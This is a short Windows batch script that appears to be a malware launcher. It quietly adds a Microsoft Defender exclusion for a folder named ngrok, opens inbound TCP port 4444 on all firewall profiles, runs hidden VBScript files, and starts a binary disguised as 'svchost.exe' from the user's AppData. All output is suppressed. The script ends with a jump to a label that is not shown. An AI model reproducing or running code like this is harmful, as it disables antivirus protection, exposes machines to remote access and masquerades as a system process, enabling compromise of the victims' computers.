@echo off
setlocal

set "NGROK_PATH=%LOCALAPPDATA%\ngrok"

powershell -Command "$ngrokPath = '%NGROK_PATH%'; Add-MpPreference -ExclusionPath $ngrokPath" >nul 2>&1
powershell -Command "New-NetFirewallRule -DisplayName 'FlaskApp' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444 -Profile Any -EdgeTraversalPolicy Allow" >nul 2>&1

if exist "%NGROK_PATH%\nt.vbs" (
    start "" wscript.exe "%NGROK_PATH%\nt.vbs"
)

if exist "%NGROK_PATH%\hst.vbs" (
    start "" wscript.exe "%NGROK_PATH%\hst.vbs"
)

timeout /t 2 >nul
if exist "C:\Program Files\dotnet" (
    start "" "%NGROK_PATH%\svchost.exe"
    exit /b
)
goto CHECK_DOTNET
